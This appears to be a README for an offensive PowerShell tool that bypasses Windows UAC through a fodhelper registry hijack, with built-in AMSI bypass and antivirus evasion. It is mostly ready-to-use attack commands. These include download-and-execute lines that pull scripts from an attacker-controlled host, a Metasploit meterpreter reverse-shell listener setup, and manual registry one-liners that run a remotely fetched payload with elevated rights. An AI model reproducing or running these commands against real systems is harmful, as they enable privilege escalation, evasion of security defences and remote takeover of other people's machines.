# UAC Bypass

## Files

| File | Purpose |
|---|---|
| `uac-bypass.ps1` | PowerShell — fodhelper registry hijack with inline AMSI bypass + AV evasion |

## Usage

**1. Update the payload in `uac-bypass.ps1`:**
```powershell
$payload = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -c " +
           "`"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')`""
```
Replace `<IP>` with your attacker IP. `run.ps1` is whatever you want executed elevated.

**2. Host your payload on your HTTP server:**
```bash
python3 -m http.server 80
```

**3. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```

**4. Run the script from a non-elevated PowerShell session on the target:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/uac-bypass.ps1')
```

Or transfer and run directly:
```powershell
powershell.exe -ExecutionPolicy Bypass -File uac-bypass.ps1
```

The script will:
1. Bypass AMSI inline before anything runs
2. Check if already elevated — exits if so
3. Write the payload command into the `ms-settings` registry key via .NET API
4. Launch `fodhelper.exe` which auto-elevates and triggers the payload
5. Sleep 3 seconds then clean up the registry key

---

## Manual One-Liners

**Basic — spawns an elevated PowerShell:**
```powershell
New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value powershell.exe -Force
New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -PropertyType String -Force
C:\\Windows\\System32\\fodhelper.exe
```

**With payload — downloads and runs your script elevated:**
```powershell
New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://10.10.2.129/run.ps1') | IEX" -Force
New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -PropertyType String -Force
C:\\Windows\\System32\\fodhelper.exe
```

> Use the manual one-liners when you already have a shell and just need quick elevation. Use `uac-bypass.ps1` when you need AV evasion and AMSI bypass baked in.
